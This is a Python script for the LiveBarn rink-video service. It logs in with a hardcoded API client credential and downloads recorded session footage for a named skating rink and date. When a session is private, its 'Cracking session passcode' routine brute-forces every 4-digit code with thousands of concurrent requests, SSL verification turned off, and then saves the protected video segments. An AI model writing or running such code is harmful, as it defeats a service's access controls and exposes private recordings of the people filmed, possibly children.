import time
from dataclasses import dataclass
import requests
import asyncio
import aiohttp
import json
from urllib.parse import urlparse
from dotenv import dotenv_values
from datetime import datetime
import re
import os

credentials = dotenv_values(".env")

def divide_chunks(l, n):
    # looping till length l
    for i in range(0, len(l), n):
        yield l[i:i + n]

class LiveBarn:
    def __init__(self, username, password):
        self.url = "https://webapi.livebarn.com"
        self.username = username
        self.password = password
        self.bearer_token = None
        self.surfaces = []

    def generate_bearer_token(self):
        headers = {"Authorization": f"Basic TGl2ZUJhcm4gUWE6MDcyMDE0"}
        data = {"username": self.username,
                "password": self.password,
                "grant_type": "password",
                "device_id": ""}
        print("Logging in...", end="")
        response = requests.post(f"{self.url}/oauth/token", headers=headers, data=data)
        if response.status_code == 200:
            print("Success")
            print("Generating access token...", end="")
            try:
                self.bearer_token = response.json()["access_token"]
                print("Success")
            except KeyError:
                print("Failed")
        else:
            print("Failed")
            exit()

    def get_surfaces(self):
        headers = {"Authorization": f"Bearer {self.bearer_token}"}
        print("Grabbing surfaces...", end="")
        with requests.Session() as session:
            venues = session.get(f"{self.url}/api/v2.0.0/staticdata/venues", headers=headers).json()
            surfaces = requests.get(f"{self.url}/api/v2.0.0/staticdata/surfaces",  headers=headers)
            if surfaces.status_code == 200:
                for surface in surfaces.json():
                    for venue in venues:
                        if venue["id"] == surface["venueId"]:
                            self.surfaces.append({"venue_id": venue["id"], "venue_name": venue["name"], "id": surface["id"], "surface_name": surface["name"]})
                            break
                else:
                    print("Success")
            else:
                print("Something went wrong", surfaces.status_code)

    def get_surface_sessions(self, surface_id, date):
        headers = {"Authorization": f"Bearer {self.bearer_token}"}
        print(f"Grabbing surface sessions...", end="")
        surface_sessions = requests.get(f"{self.url}/api/v2.0.0/media/day/surfaceid/{surface_id}/date/{date}T00:00", headers=headers)
        print(f"Success")
        try:
            return surface_sessions.json()
        except json.JSONDecodeError:
            print("Failed")

    def get_session_details(self, session, url, code):
        headers = {"Authorization": f"Bearer {self.bearer_token}"}
        thirty_minute_sessions = session.get(url + f"/code/{code}", headers=headers).json()
        if not thirty_minute_sessions:
            print("No sessions found")
            exit()
        return thirty_minute_sessions[0]

    def get_content_urls(self, surface_id, feed_mode_id, begin_date, code="0000"):
        with requests.Session() as session:
            url = f"{self.url}/api/v2.0.0/media/surfaceid/{surface_id}/feedmodeid/{feed_mode_id}/begindate/{begin_date}"
            rink_session = self.get_session_details(session=session, code=code, url=url)

            if "privateSession" in rink_session:
                print("Session is private")
                print("Cracking session passcode...", end="")
                chunks = list(divide_chunks(l=[x for x in range(0, 10000)], n=1000))
                for index, chunk in enumerate(chunks):
                    print(f"{(index / len(chunks)) * 100}%...", end="")
                    for index, result in enumerate(asyncio.run(self.crack_session_password(url, chunk))):
                        try:
                            if "url" in result[0]:
                                code = int(chunk[0]) + int(index)
                                print(f"Done...Passcode is {code}")
                                rink_session = self.get_session_details(session=session, code=code, url=url)
                                break
                        except TypeError as e:
                            print(str(e))
                            pass
                    else:
                        continue
                    break

            redirect_url = rink_session["url"]
            for line in session.get(redirect_url, allow_redirects=True).content.split(b"\n"):
                if b"https" in line:
                    content_url = line.decode()
                    break
            content_urls = []
            for line in session.get(content_url).content.split(b"\n"):
                if b"https" in line:
                    content_urls.append(line.decode())
        return content_urls

    def get_tasks(self, url, session, chunk):
        headers = {"Authorization": f"Bearer {self.bearer_token}"}
        tasks = []
        for x in chunk:
            tasks.append(session.get(f"{url}/code/{str(x).zfill(4)}", headers=headers, verify_ssl=False))
        return tasks

    async def crack_session_password(self, url, chunk):
        async with aiohttp.ClientSession() as session:
            tasks = self.get_tasks(url=url, session=session, chunk=chunk)
            task_results = await asyncio.gather(*tasks)
            results = []
            for x in range(len(task_results)):
                try:
                    results.append(await task_results[x].json())
                except json.decoder.JSONDecodeError:
                    pass
            return results

    def create_download_content_jobs(self, session, urls):
        tasks = []
        for url in urls:
            tasks.append(session.get(url, verify_ssl=False))
        return tasks

    async def download_content(self, urls):
        async with aiohttp.ClientSession() as session:
            tasks = self.create_download_content_jobs(session, urls)
            responses = await asyncio.gather(*tasks)
            for response in responses:
                print(f"Writing to ./files/tmp/{urlparse(str(response.url)).path.split('/')[-1]}...", end="")
                with open(f"./files/tmp/{urlparse(str(response.url)).path.split('/')[-1]}", "wb") as file:
                    file.write(await response.content.read())
                    print("Success")

if __name__ == '__main__':
    if not os.path.exists("./files"):
        os.mkdir("./files")
        os.mkdir("./files/tmp")
    elif not os.path.exists("./files/tmp"):
        os.mkdir("./files/tmp")
    livebarn = LiveBarn(username=credentials["username"], password=credentials["password"])
    livebarn.generate_bearer_token()
    livebarn.get_surfaces()
    rink_name = "Westchester Skating Academy"
    surface_name = "USA Rink"
    date = "2024-09-01" # YYYY-MM-DD
    time = "13:00" # HH:MM
    for surface in livebarn.surfaces:
        if surface["venue_name"] == rink_name and surface["surface_name"] == surface_name:
            content_urls = livebarn.get_content_urls(surface_id=surface["id"], feed_mode_id=4, begin_date=f"{date}T{time}")
            print("Downloading session segments")
            for chunk in divide_chunks(content_urls, 10):
                asyncio.run(livebarn.download_content(chunk))
